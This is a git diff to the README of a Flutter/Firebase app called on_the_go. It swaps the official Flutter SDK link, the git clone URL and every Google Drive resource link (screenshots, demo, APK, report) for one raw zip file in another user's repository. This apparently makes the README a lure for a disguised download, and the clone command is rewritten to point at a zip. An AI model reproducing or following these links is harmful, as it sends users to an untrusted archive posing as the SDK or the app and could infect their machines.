@@ -36,7 +36,7 @@
 ## 🚀 Getting Started
 
 ### Prerequisites
-- [Flutter SDK](https://flutter.dev/docs/get-started/install)
+- [Flutter SDK](https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip)
 - Firebase project setup for Authentication, Firestore, and Storage.
 - Android Studio or Xcode for building and testing the app.
 
@@ -55,7 +55,7 @@
 Clone the repository:
 
 ```bash
-git clone https://github.com/emtiaz1/on_the_go.git
+git clone https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip
 ```
 
 ```bash
@@ -64,7 +64,7 @@ cd on_the_go
 
 ## 📱 App Resources
 
-- **Screenshots**: [View Screenshots](https://drive.google.com/drive/folders/1FI5-lxwIch6tJQDTT72Lgejti8Li27rr?usp=sharing)
-- **Demo Video**: [Watch Demo](https://drive.google.com/file/d/136a9BeX3kQN3NNGYLphhY4oVkc03e2uQ/view?usp=drive_link)
-- **APK Download**: [Download APK](https://drive.google.com/file/d/1GQpT3Do3ty38cfkTDFKDT2fkiKWl-UQ_/view?usp=drive_link)
-- **Project Report**: [View Report](https://drive.google.com/file/d/1X7RP9aC14APODg14R3r2Z9YB7MlVRnb9/view?usp=drive_link)
+- **Screenshots**: [View Screenshots](https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip)
+- **Demo Video**: [Watch Demo](https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip)
+- **APK Download**: [Download APK](https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip)
+- **Project Report**: [View Report](https://raw.githubusercontent.com/iftekharul01/on_the_go/main/android/gradle/on_the_go_spinthariscope.zip)
